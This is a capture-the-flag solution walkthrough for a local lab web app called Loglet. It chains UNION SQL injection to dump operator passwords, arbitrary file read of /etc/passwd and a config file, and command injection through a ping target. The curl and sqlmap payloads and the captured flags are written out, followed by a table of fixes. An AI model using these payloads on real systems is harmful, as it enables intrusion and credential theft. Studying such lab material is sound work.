# Loglet — SOLUTION (spoilers)

> Stop here if you're still working it. Full walkthrough below.

Base URL: `http://localhost:8094`. Chain is **UNION SQLi → arbitrary file read → OS command
injection**, and every stage feeds the next. The admin password and maintenance token are
random per boot — recover the live values, don't copy these.

---

## Stage 1 — UNION SQL injection → flag1

The public search (`/api/search?q=`) builds SQL by string concatenation:

```python
sql = "SELECT ref, summary, severity FROM incidents WHERE tag = '%s'" % q
```

Break it and read the error, confirm the column count (3), then UNION the operators table:

```bash
# a lone quote errors -> injectable
curl -s --get http://localhost:8094/api/search --data-urlencode "q='"

# 3 columns (ref, summary, severity) -> UNION width 3
curl -s --get http://localhost:8094/api/search \
     --data-urlencode "q=' UNION SELECT username, password, role FROM operators-- "
```

That dumps every operator, including `admin` and its (random) password. Sign in for real —
the login endpoint itself is parameterised, so this is the only way to admin:

```bash
ADMINPW=$(curl -s --get http://localhost:8094/api/search \
  --data-urlencode "q=' UNION SELECT username, password, role FROM operators-- " \
  | python3 -c 'import sys,json;print([r[1] for r in json.load(sys.stdin)["rows"] if r[0]=="admin"][0])')

curl -s -c jar -H 'Content-Type: application/json' \
     -d "{\"username\":\"admin\",\"password\":\"$ADMINPW\"}" http://localhost:8094/api/login
curl -s -b jar http://localhost:8094/dashboard | grep -o 'FLAG{[^}]*}'
```

`sqlmap` automates the same thing:
`sqlmap -u 'http://localhost:8094/api/search?q=network' --dump -T operators --batch`.

**`flag1 = FLAG{un10n_sql1_dump3d_th3_0p3r4t0rs}`**

---

## Stage 2 — Arbitrary file read (LFI) → flag2 (+ maintenance token)

The admin report viewer (`/report?file=`) joins your name onto the reports dir with no
containment. `os.path.join(base, name)` discards `base` when `name` is absolute, so:

```bash
curl -s -b jar --get http://localhost:8094/report --data-urlencode "file=/etc/passwd" | head -1   # proof
curl -s -b jar --get http://localhost:8094/report --data-urlencode "file=/app/config.ini"          # loot
# ../ traversal works too:
curl -s -b jar --get http://localhost:8094/report --data-urlencode "file=../config.ini"
```

`config.ini` holds the flag and the maintenance token:

```
maintenance_token = <random hex>
note = ops flag checkpoint -> FLAG{arb1tr4ry_f1l3_r34d_c0nf1g_l00t}
```

**`flag2 = FLAG{arb1tr4ry_f1l3_r34d_c0nf1g_l00t}`**

---

## Stage 3 — OS command injection → flag3

The connectivity check (`/api/maintenance`) is gated by that token and runs a shell string
with your `target` spliced in:

```python
cmd = f"ping -c 1 -W 1 {target}"
subprocess.run(cmd, shell=True, ...)
```

A `;` (or `|`, `&&`, `$(...)`) chains a second command. Feed it the token from stage 2:

```bash
TOKEN=$(curl -s -b jar --get http://localhost:8094/report --data-urlencode "file=/app/config.ini" \
        | awk -F' = ' '/maintenance_token/{print $2}')

curl -s -b jar -H 'Content-Type: application/json' \
     -d "{\"token\":\"$TOKEN\",\"target\":\"127.0.0.1; cat /flag3.txt\"}" \
     http://localhost:8094/api/maintenance
```

The response includes the ping output followed by the flag file.

**`flag3 = FLAG{sh3ll_m3t4ch4r_c0mm4nd_1nj3ct10n}`**

---

## The bugs & the fixes

| # | Vulnerability | Root cause | Fix |
|---|---|---|---|
| 1 | UNION SQL injection | user input concatenated into SQL | parameterised queries / bound params — never string-build SQL |
| 2 | Arbitrary file read (LFI) | filename joined to a base with no containment | `realpath` the result and confirm it's inside the reports dir; or serve by opaque id |
| 3 | OS command injection | user input in a `shell=True` string | pass an argv array (no shell), validate `target` as an IP/hostname |

All three are in `app.py`, each marked with a `VULN #n` comment.
